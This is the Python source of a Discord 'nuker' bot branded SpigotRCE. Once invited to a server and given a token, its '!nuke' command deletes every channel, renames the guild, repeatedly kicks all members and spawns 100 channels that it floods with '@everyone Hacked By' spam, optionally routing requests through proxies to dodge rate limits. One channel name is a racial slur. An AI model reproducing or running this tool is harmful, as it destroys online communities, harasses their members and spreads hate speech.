from os import system


def print_logo():
    system("cls || clear")
    print("""
     _____                       _   _       _             
    /  ___|                     | \\ | |     | |            
    \\ `--.  __ _ _ __  _ __ __ _|  \\| |_   _| | _____ _ __ 
     `--. \\/ _` | '_ \\| '__/ _` | . ` | | | | |/ / _ \\ '__|
    /\\__/ / (_| | |_) | | | (_| | |\\  | |_| |   <  __/ |   
    \\____/ \\__,_| .__/|_|  \\__,_\\_| \\_/\\__,_|_|\\_\\___|_|   
                | |                                        
                |_|                                        
    """)


try:
    import requests
    import time
    import threading
    import random
    import discord
    from discord.ext import commands

except ModuleNotFoundError:
    print("Required modules not found, installing...")
    system("python -m pip install requests")
    system("python3 -m pip install requests")
    system("python -m pip install discord")
    system("python3 -m pip install discord")
    print("All modules should be installed, please restart the script.")
    input("Press enter to restart...")

print_logo()
# All parameters
LINK = 'https://YouTube.com/@SpigotRCE https://discord.gg/3meyfSZ37J'
MESSAGES = [
    '@everyone Hacked By ' + LINK,
    '@everyone Fucked By ' + LINK,
    '@everyone Owned By ' + LINK,
    '@everyone Nuked By ' + LINK
]
CHANNEL_NAMES = [
    'Hacked',
    'Fucked',
    'Nuked',
    'Nigger'
]

GUILD = 0
TOKEN = input("Enter token: ")
USE_PROXY = True if input("Use proxy Y/n (Not recommended)") in ["y", "yes", "Y", "Yes", "YES"] else False
print("Using proxies" if USE_PROXY else "")
headers = {'authorization': f'Bot {TOKEN}'}


def get_all_channels():
    while True:
        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers, proxies=get_proxy())
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                return r.json()
            else:
                return


def get_all_members():
    members = []
    url = f'https://discord.com/api/v10/guilds/{GUILD}/members?limit=1000'

    while True:
        response = requests.get(url, headers=headers, proxies=get_proxy())
        if response.status_code == 200:
            members_data = response.json()
            members.extend(members_data)
            if 'next' in response.json():
                url = response.json()['next']
            else:
                break
        elif response.status_code == 429:
            time.sleep(int(response.headers.get('Retry-After', 1)))
        else:
            print(f"Failed to fetch members. Status code: {response.status_code}")
            return None

    return members


def get_all_roles():
    roles = []
    response = requests.get(f'https://discord.com/api/v10/guilds/{GUILD}/roles', headers=headers)
    if response.status_code == 200:
        roles_data = response.json()
        roles.extend(roles_data)
    elif response.status_code == 429:
        time.sleep(int(response.headers.get('Retry-After', 1)))
    else:
        print(f"Failed to fetch roles. Status code: {response.status_code}")
        return None

    return roles


def remove_channel(_id):
    while True:
        r = requests.delete(f"https://discord.com/api/v10/channels/{_id}", headers=headers, proxies=get_proxy())
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                # print(f"[Success] Removed channel: {_id}")
                return


def channel(name):
    while True:
        json = {'name': f"{name}-{str(random.randrange(1, 987987987))}", 'type': 0}
        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json,
                          proxies=get_proxy())
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                _id = r.json()["id"]
                # print(f"[Success] Created channel: {id}")
                threading.Thread(target=send_message, args=(_id,)).start()
                return
            else:
                continue


def send_message(_id):
    while True:
        json = {'content': random.choice(MESSAGES)}
        r = requests.post(f'https://discord.com/api/v10/channels/{_id}/messages', headers=headers, json=json,
                          proxies=get_proxy())
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])


def kick_member(_id):
    while True:
        url = f'https://discord.com/api/v10/guilds/{GUILD}/members/{_id}'
        response = requests.delete(url, headers=headers, proxies=get_proxy())

        if response.status_code == 204:
            # print(f"Successfully kicked member: {id}")
            return


def remove_channels(channel_ids):
    for channel_id in channel_ids:
        threading.Thread(target=remove_channel, args=(channel_id,)).start()


def remove_members():
    time.sleep(2)
    while True:
        for profile in get_all_members():
            threading.Thread(target=kick_member, args=(profile['user']['id'],)).start()


PROXIES = []
if USE_PROXY:
    with open('proxies.txt', 'r') as f:
        for line in f.read().splitlines():
            PROXIES.append(line)
        print(f"Loaded {len(PROXIES)} proxies.")


def get_proxy():
    if not USE_PROXY:
        return None
    PROXY = random.choice(PROXIES)
    return {"http": PROXY, "https": PROXY}


BOT = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)


@BOT.event
async def on_ready():
    await BOT.change_presence(status=discord.Status.idle, activity=discord.Game(name='Looking for a cup of coffee'))
    print("Bot loaded!")
    print("Bot is in " + str(len(BOT.guilds)) + " server.")
    for guild in BOT.guilds:
        print(guild.name + " (" + str(guild.id) + ") owner: " + guild.owner.name + " (" + str(guild.owner.id) + ") ")


@BOT.command()
async def nuke(ctx):
    global GUILD
    GUILD = ctx.guild.id
    await ctx.message.delete()
    await ctx.channel.delete()
    await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
    threading.Thread(target=remove_members).start()
    channel_ids = [c['id'] for c in get_all_channels()]
    if len(channel_ids) != 0:
        remove_channels(channel_ids)
    else:
        print("No channels found.")
    for _ in range(100):
        threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()


@BOT.event
async def on_guild_channel_create(_channel):
    print(f"Channel created {_channel.id}")


@BOT.event
async def on_guild_channel_delete(_channel):
    print(f"Channel deleted {_channel.name}")


@BOT.event
async def on_member_remove(member):
    print(f"Kicked {member.name}")


BOT.run(TOKEN)
